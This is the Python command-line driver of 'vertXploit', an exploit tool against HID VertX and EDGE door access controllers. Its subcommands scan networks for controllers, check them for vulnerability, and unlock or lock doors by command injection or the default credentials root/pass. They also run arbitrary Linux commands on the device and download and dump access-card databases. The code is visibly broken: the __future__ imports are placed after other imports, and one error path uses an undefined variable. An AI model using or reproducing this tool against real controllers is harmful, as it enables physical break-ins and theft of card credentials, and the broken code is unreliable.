#!/usr/bin/env python
# Copyright (c) 2017, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import argparse
import os
import re
import tabulate

from __future__ import print_function
from __future__ import unicode_literals

from vertXploit.actions import Actions
from vertXploit.database import Database
from vertXploit.discover import Discover


def main():
	parser = argparse.ArgumentParser(description='Exploit HID VertX and EDGE door access controllers.', usage='vertXploit.py [discover, fingerprint, unlock, lock, raw, download, dump] [-h]')
	subparsers = parser.add_subparsers(title='Actions', dest='action', help='Action to perform on the controller', metavar='{discover, fingerprint, unlock, lock, raw, download, dump}')

	discover_parser = subparsers.add_parser('discover', help='Find controllers on the network', usage='vertXploit.py discover --ip IP')
	discover_parser.add_argument('--ip', dest='ip', help='IP address or CIDR range (default: 255.255.255.255)', default='255.255.255.255', metavar='IP')

	fingerprint_parser = subparsers.add_parser('fingerprint', help='Return information about the controller', usage='vertXploit.py fingerprint IP')
	fingerprint_parser.add_argument('ip', help='Controller IP address', metavar='IP')

	unlock_parser = subparsers.add_parser('unlock', help='Unlock doors connected to the controller', usage='vertXploit.py unlock IP --username USERNAME --password PASSWORD')
	unlock_parser.add_argument('ip', help='Controller IP address', metavar='IP')
	unlock_parser.add_argument('--username', help='Web interface username, (default: root)', default='root', metavar='USERNAME')
	unlock_parser.add_argument('--password', help='Web interface password, (default: pass)', default='pass', metavar='PASSWORD')

	lock_parser = subparsers.add_parser('lock', help='Lock doors connected to the controller', usage='vertXploit.py lock IP --username USERNAME --password PASSWORD')
	lock_parser.add_argument('ip', help='Controller IP address', metavar='IP')
	lock_parser.add_argument('--username', help='Web interface username, (default: root)', default='root', metavar='USERNAME')
	lock_parser.add_argument('--password', help='Web interface password, (default: pass)', default='pass', metavar='PASSWORD')

	raw_parser = subparsers.add_parser('raw', help='Execute a Linux command on the controller', usage='vertXploit.py raw IP COMMAND')
	raw_parser.add_argument('ip', help='Controller IP address', metavar='IP')
	raw_parser.add_argument('command', help='Linux command, (example: ping -c 5 IP)', metavar='COMMAND')

	download_parser = subparsers.add_parser('download', help='Download databases from the controller', usage='vertXploit.py download IP --username USERNAME --password PASSWORD')
	download_parser.add_argument('ip', help='Controller IP address', metavar='IP')
	download_parser.add_argument('--username', help='Web interface username, (default: root)', default='root', metavar='USERNAME')
	download_parser.add_argument('--password', help='Web interface password, (default: pass)', default='pass', metavar='PASSWORD')

	dump_parser = subparsers.add_parser('dump', help='Parse card values from the downloaded databases', usage='vertXploit.py dump --path PATH')
	dump_parser.add_argument('--path', help='Path to database files', default=os.getcwd(), metavar='PATH')

	args = parser.parse_args()

	# Discover
	if args.action == 'discover':
		vertx = Discover(args.ip)
		if re.match(r'(^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$)', args.ip):
			print_status("Starting Nmap scan on {0} subnet".format(args.ip))
			controllers = vertx.scan()
		else:
			print_status("Sending discovery request to {0}".format(args.ip))
			controllers = vertx.broadcast()

		if len(controllers) > 0:
			print_good('VertX Controllers Identified')
			print(tabulate.tabulate(controllers, headers=['IP', 'Port', 'MAC'], tablefmt='psql', stralign='center', numalign='center'))
		else:
			print_warn('No VertX controllers found')

	# Fingerprint
	elif args.action == 'fingerprint':
		print_status("Fingerprinting {0}".format(args.ip))
		vertx_info = Actions(args.ip).fingerprint()
		if None not in vertx_info.values():
			print_good('VertX Controller Information')
			print("RAW: {0}".format(vertx_info['raw']))
			print("Name: {0}".format(vertx_info['name']))
			print("Model: {0}".format(vertx_info['model']))
			print("Version: {0} - ({1})".format(vertx_info['version'], vertx_info['data']))
			print("IP Address: {0}".format(vertx_info['ip']))
			print("MAC Address: {0}".format(vertx_info['mac']))

			if vertx_info['vulnerable']:
				print("Vulnerable: \033[1m\033[32mTrue\033[0m")
			else:
				print("Vulnerable: \033[1m\033[33mFalse\033[0m")
		else:
			print_warn('Device might not be a VertX controller')

	# Unlock
	elif args.action == 'unlock':
		vertx = Actions(args.ip, args.username, args.password)
		if vertx.vertx_info['vulnerable']:
			print_status('Unlocking doors using command injection')
		else:
			print_status('Unlocking doors through the web interface')

		response = vertx.unlock()
		if response:
			print_good('Door successfully unlocked')
		elif response is False:
			print_warn('Door unlock failed')
		else:
			print_error('Door unlock failed, bad credentials')

	# Lock
	elif args.action == 'lock':
		vertx = Actions(args.ip, args.username, args.password)
		if vertx.vertx_info['vulnerable']:
			print_status('Locking doors using command injection')
		else:
			print_status('Locking doors through the web interface')

		response = vertx.lock()
		if response:
			print_good('Door successfully locked')
		elif response is False:
			print_warn('Door lock failed')
		else:
			print_error('Door lock failed, bad credentials')

	# Raw
	elif args.action == 'raw':
		vertx = Actions(args.ip)
		if vertx.vertx_info['vulnerable']:
			print_status('Sending raw payload')
			response = vertx.raw(args.command)
			if response:
				print_good('Command sent successfully')
			else:
				print_error('Command injection failed')
		else:
			print_error('VertX controller is not vulnerable to command injection')

	# Download
	elif args.action == 'download':
		vertx = Actions(args.ip, args.username, args.password)
		if vertx.vertx_info['vulnerable']:
			print_status('Downloading VertX databases')
			databases = vertx.download()
			for database in databases:
				if databases[database]:
					print_good('Successfully downloaded {0}'.format(database))
				elif databases[database] is False:
					print_warn('Download failed, bad username or password')
					break
				else:
					print_error("Unable to find database at http://{0}/{1}".format(args.ip, database))
		else:
			print_error('VertX controller is not vulnerable to command injection')

	# Dump
	else:
		if os.path.isfile("{0}/IdentDB".format(args.path)) and os.path.isfile("{0}/AccessDB".format(args.path)):
			print_status('Processing card information from VertX databases')
			card_data = Database(args.path).dump()
			if len(card_data) > 0:
				print(tabulate.tabulate(card_data, headers=['DB ID', 'Card ID', 'Door', 'Enabled'], tablefmt='psql', stralign='center', numalign='center'))
			else:
				print_warn('No card data in database')
		else:
			print_error("Could not find IdentDB or AccessDB in {0}/".format(os.path.abspath(path)))


def print_status(message):
	print("\033[1m\033[34m[*]\033[0m {0}".format(message))


def print_good(message):
	print("\033[1m\033[32m[+]\033[0m {0}".format(message))


def print_warn(message):
	print("\033[1m\033[33m[!]\033[0m {0}".format(message))


def print_error(message):
	print("\033[1m\033[31m[-]\033[0m {0}".format(message))


if __name__ == '__main__':
	main()
